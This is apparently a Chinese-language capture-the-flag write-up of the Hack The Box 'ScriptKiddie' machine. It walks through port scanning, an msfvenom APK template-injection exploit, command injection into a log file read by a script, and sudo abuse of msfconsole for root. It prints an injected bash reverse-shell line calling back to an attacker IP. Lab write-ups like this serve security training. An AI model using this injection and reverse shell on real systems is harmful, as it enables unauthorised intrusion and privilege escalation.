> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/v8sVPCRMxfdx5j99jIIJvg)

**文章源自【字节脉搏社区】-字节脉搏实验室**

**作者-Zone**

**扫描下方二维码进入社区：**

**![图片](https://mmbiz.qpic.cn/mmbiz_png/ia3Is12pQKnK3Fc7MgHHCICGGSg2l58vxaP5QwOCBcU48xz5g8pgSjGds3Oax0BfzyLkzE9Z6J4WARvaN6ic0GRQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)**

 在HTB里面看到了一些新的靶场，便开始了靶场之路

![图片](https://mmbiz.qpic.cn/mmbiz_png/ia3Is12pQKnK82jyeQoGf7zTRFg3hIjaXiciaaSlueHFj8vsYWMCWeSESI14vvx2fH3S7r3wSr07dXPmRjINtQ6icA/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

    ScriptKiddie 难度4.1，感觉还行，开启环境，先访问下ip

![图片](https://mmbiz.qpic.cn/mmbiz_png/ia3Is12pQKnK82jyeQoGf7zTRFg3hIjaXvYybY87gABNqrJ2qqbpc3cM7mjMXrbopmB84yWJp2ySKs7V4CCibrOg/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

拒绝访问，说明具有web站点，但80端口未开放，nmap扫描端口

![图片](https://mmbiz.qpic.cn/mmbiz_png/ia3Is12pQKnK82jyeQoGf7zTRFg3hIjaXZiaUziaVjYT97aV6ibP1P6oKFzNic0eqEicDMQsz0G2ACD0XQAmA96uYiaPQ/640?wx_fmt=png&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1)

开放了22，5000，8000，8888端口，但5000端口和8888端口打开是拒绝访问，所以从5000端口入手

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

工具集成的页面，nmap、msfvenom、searchsploit三款工具集成，先使用nmap ping127.0.0.1看下信息

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

两个端口22和5000，版本7.80，搜索一圈后没发现nmap7.80存在可利用漏洞，目光转向mfvenom，在exploit-db里找到一篇msfvenom apk模板注入，可以利用

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

因为有提供payload，下载之后保存到本地

运行payload会提示没有jarsigner命令，执行sudo apt-get install openjdk-11-jdk-headless，然后修改payload

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

这里注意ip，如果是虚拟机先下载openvpn(sudo apt-get openvpn) 在htb上下载配置文件，直接用openvpn打开就可以

查看下自己的ip，确认和靶机在同一个段，然后运行payload会生成一个evil.apk文件，在venom处上传apk文件，同时监听443端口

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

第二种方法：msf生成，在msf里搜索venom，调用第一个，设置好ip和端口，然后执行，在本地生成一个msf.apk，监听端口，上传，得到shell

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

相比较而言，第二种更稳定一点。得到shell之后切换到home目录可以看到存在kid和pwn两个用户，进入kid用户，可以看到user.txt，得到普通用户的flag![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

在pwn用户下看到存在scanlosers.sh文件，查看发现scanlosers.sh会一直扫描/home/kid/logs/hackers文件中的ip，但是该shell脚本未对hackers文件传入的内容做过滤，且/home/kid/logs/hackers文件当前用户kid可编辑

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

因此可以通过写入恶意代码“test  ;/bin/bash -c 'bash -i >&/dev/tcp/10.10.14.2/8888 0>&1' #”，利用命令注入获得pwn用户的shell

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

得到pwn用户的shell，sudo -l发现不需要密码的sudo程序

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

sudo /opt/metasploit-framework-6.0.0/msfconsole

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

切换至root目录，查看

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

发现root.txt，查看该txt文件得到root用户的flag

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

提交，完事

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

  

注意事项：1、exp下载之后需要执行sudo apt-get install openjdk-11-jdk-headless命令

                  2、注意ip，确认主机和靶机在同一网段，如果是虚拟机，先下载openvpn，然后下载配置文件，使用openvpn打开即可  

                  3、如果上传的时候nc无法反弹回shell，可以重置一下靶机，删除已经生成好的apk文件重新生成一个apk文件，在进行上传

  

**通知！**

**公众号招募文章投稿小伙伴啦！只要你有技术有想法要分享给更多的朋友，就可以参与到我们的投稿计划当中哦~感兴趣的朋友公众号首页菜单栏点击【商务合作-我要投稿】即可。期待大家的参与~**

**![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)**

**记得扫码**

**关注我们**